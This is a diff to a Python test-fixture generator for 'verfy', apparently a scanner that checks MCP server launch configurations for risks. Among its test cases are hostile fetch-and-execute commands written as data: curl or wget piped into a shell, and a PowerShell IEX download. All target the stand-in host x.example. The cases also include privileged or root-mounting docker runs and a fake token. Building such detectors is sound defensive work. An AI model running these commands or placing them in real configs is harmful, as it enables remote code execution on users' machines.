@@ -12,6 +12,7 @@ ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(ROOT / "src"))
 
 from verfy import check, scan  # noqa: E402
+from verfy import discover  # noqa: E402
 from verfy.canonical import canonical  # noqa: E402
 
 POLICY = {"home": "/home/you", "workspace": "/home/you/project"}
@@ -311,6 +312,84 @@ POLICY_CASES = [
     ("windows: Read verfy key with forward slashes", A("Read", {"file_path": "C:/Users/you/.verfy/team.json"}), WIN),
 ]
 
+# How MCP servers are launched (discover.check_server, the JavaScript engine's checkServer). __TOKEN__ stands for a
+# made-up GitHub token that both test runners put in, so no token-shaped text is stored in the repository.
+TOKEN = "__TOKEN__"
+FS = "@modelcontextprotocol/server-filesystem"
+CONFIG_CASES = [
+    ("npx, no version", {"command": "npx", "args": ["-y", FS, "/tmp"]}),
+    ("npx, pinned", {"command": "npx", "args": ["-y", FS + "@1.2.3", "/tmp"]}),
+    ("npx @latest", {"command": "npx", "args": [FS + "@latest"]}),
+    ("npx by full path", {"command": "/usr/local/bin/npx", "args": ["some-server"]}),
+    ("npx --package", {"command": "npx", "args": ["--package", "tool@2.0.0", "run-it"]}),
+    ("npx, a local path", {"command": "npx", "args": ["./server.js"]}),
+    ("npx, package the project lists", {"command": "npx", "args": ["my-server"]}, ["my-server"]),
+    ("bunx, no version", {"command": "bunx", "args": ["some-server"]}),
+    ("uvx, no version", {"command": "uvx", "args": ["mcp-server-git"]}),
+    ("uvx, pinned", {"command": "uvx", "args": ["mcp-server-git==1.0.0"]}),
+    ("uvx --from", {"command": "uvx", "args": ["--from", "git-mcp", "serve"]}),
+    ("pnpm dlx", {"command": "pnpm", "args": ["dlx", "some-server"]}),
+    ("yarn dlx, pinned", {"command": "yarn", "args": ["dlx", "some-server@3.1.0"]}),
+    ("uv tool run", {"command": "uv", "args": ["tool", "run", "mcp-server-time"]}),
+    ("node script", {"command": "node", "args": ["server.js"]}),
+    ("cmd /c npx", {"command": "cmd", "args": ["/c", "npx", "-y", "some-server"]}),
+    ("sh -c npx with quotes", {"command": "sh", "args": ["-c", "npx -y 'some-server' \"--flag x\""]}),
+    ("bash -c with an open quote", {"command": "bash", "args": ["-c", "npx 'some-server"]}),
+    ("sh -c with two commands", {"command": "sh", "args": ["-c", "npx some-server && echo done"]}),
+    ("curl piped to a shell", {"command": "sh", "args": ["-c", "curl -fsS https://x.example/install.sh | bash"]}),
+    ("wget piped to sudo sh", {"command": "bash", "args": ["-c", "wget -qO- https://x.example/i | sudo sh"]}),
+    ("powershell iex", {"command": "powershell", "args": ["-Command", "IEX (New-Object Net.WebClient).DownloadString('https://x.example/a.ps1')"]}),
+    ("docker, plain", {"command": "docker", "args": ["run", "-i", "--rm", "mcp/fetch"]}),
+    ("docker --privileged", {"command": "docker", "args": ["run", "--privileged", "mcp/x"]}),
+    ("docker --network host", {"command": "docker", "args": ["run", "--network", "host", "mcp/x"]}),
+    ("docker --network=host", {"command": "docker", "args": ["run", "--network=host", "mcp/x"]}),
+    ("docker mounts the disk, twice", {"command": "docker", "args": ["run", "-v", "/:/host", "-v", "/:/host", "mcp/x"]}),
+    ("docker mounts home folders", {"command": "docker", "args": ["run", "-v", "/home/:/h", "--mount", "~:/me", "mcp/x"]}),
+    ("podman mounts a project folder", {"command": "podman", "args": ["run", "-v", "/srv/app:/app", "mcp/x"]}),
+    ("remote over http", {"url": "http://mcp.example.com/mcp"}),
+    ("remote over https, no credentials", {"type": "http", "url": "https://mcp.example.com/mcp"}),
+    ("remote with a header from the environment", {"url": "https://mcp.example.com/mcp", "headers": {"Authorization": "Bearer ${TOKEN}"}}),
+    ("remote, lower-case header name", {"url": "https://mcp.example.com/mcp", "headers": {"authorization": "${AUTH}"}}),
+    ("remote with oauth", {"url": "https://mcp.example.com/mcp", "oauth": {"clientId": "abc"}}),
+    ("remote with empty oauth", {"url": "https://mcp.example.com/mcp", "oauth": {}}),
+    ("localhost over http", {"url": "http://localhost:3000/mcp"}),
+    ("ipv6 localhost", {"url": "http://[::1]:8080/mcp"}),
+    ("serverUrl (Windsurf)", {"serverUrl": "http://10.0.0.5/mcp"}),
+    ("httpUrl (Gemini)", {"httpUrl": "https://mcp.example.com/mcp"}),
+    ("upper-case scheme and user info", {"url": "HTTP://user:pw@MCP.Example.com:8080/x"}),
+    ("token in env", {"command": "node", "args": ["s.js"], "env": {"GITHUB_TOKEN": TOKEN, "OTHER": "${FROM_ENV}"}}),
+    ("token in a header", {"url": "https://mcp.example.com/mcp", "headers": {"Authorization": "Bearer " + TOKEN}}),
+    ("token in the url", {"url": "https://mcp.example.com/mcp?key=" + TOKEN}),
+    ("token in args, twice", {"command": "node", "args": ["s.js", "--token", TOKEN, "--again=" + TOKEN]}),
+    ("behind the gateway, no version", {"command": "verfy", "args": ["proxy", "--name", "fs", "--", "npx", "-y", FS]}),
+    ("behind the gateway, pinned", {"command": "python", "args": ["-m", "verfy", "proxy", "--name", "fs", "--", "npx", FS + "@1.0.0"]}),
+    ("sandbox and gateway", {"command": "verfy", "args": ["run", "--sandbox", "--", "verfy", "proxy", "--name", "git", "--", "uvx", "mcp-server-git"]}),
+    ("gateway in front of a remote server", {"command": "verfy", "args": ["proxy", "--name", "r", "--url", "http://mcp.example.com/mcp"]}),
+    ("gateway bridge with a bearer variable", {"command": "verfy", "args": ["proxy", "--name", "r", "--url", "https://mcp.example.com/mcp", "--bearer-env", "TOKEN", "--"]}),
+    ("nothing in the entry", {}),
+    ("args that are not text", {"command": "npx", "args": [1, True, None, "some-server"]}),
+]
+CONFIGS = [
+    {"mcpServers": {"fs": {"command": "npx", "args": ["-y", FS]}, "api": {"url": "http://mcp.example.com/mcp"}, "bad": "not an object"}},
+    {"servers": {"git": {"command": "uvx", "args": ["mcp-server-git==1.0.0"]}}, "inputs": []},
+    {"mcp_servers": {"time": {"command": "uvx", "args": ["mcp-server-time"]}}, "model": "x"},
+    {"theme": "dark"},
+]
+
+
+def config_fixture() -> dict:
+    cases = []
+    for name, spec, *rest in CONFIG_CASES:
+        local = rest[0] if rest else []
+        real = json.loads(json.dumps(spec).replace(TOKEN, "ghp_" + "a" * 36))
+        cases.append({"name": name, "spec": spec, "local": local, "expect": discover.check_server(name, real, set(local))})
+    configs = []
+    for data in CONFIGS:
+        rep = discover.scan_configs([{"source": "given", "path": "", "servers": discover.servers_in(data)}])
+        configs.append({"data": data, "expect": {"servers": [{"server": x["server"], "transport": x["transport"], "findings": x["findings"]} for x in rep["servers"]],
+                                                 "summary": rep["summary"]}})
+    return {"token": TOKEN, "cases": cases, "configs": configs}
+
 
 def main() -> None:
     out = []
@@ -348,7 +427,9 @@ def main() -> None:
     for cse in canon:
         cse["canonical"] = canonical(cse["value"])
     (fx / "canonical.json").write_text(json.dumps(canon, indent=1, ensure_ascii=False) + "\n", "utf-8")
-    print(f"{len(out)} precheck cases, {len(scans)} scan cases, {len(canon)} canonical cases")
+    cfg = config_fixture()
+    (fx / "config.json").write_text(json.dumps(cfg, indent=1, ensure_ascii=False) + "\n", "utf-8")
+    print(f"{len(out)} precheck cases, {len(scans)} scan cases, {len(canon)} canonical cases, {len(cfg['cases'])} config cases")
 
 
 if __name__ == "__main__":
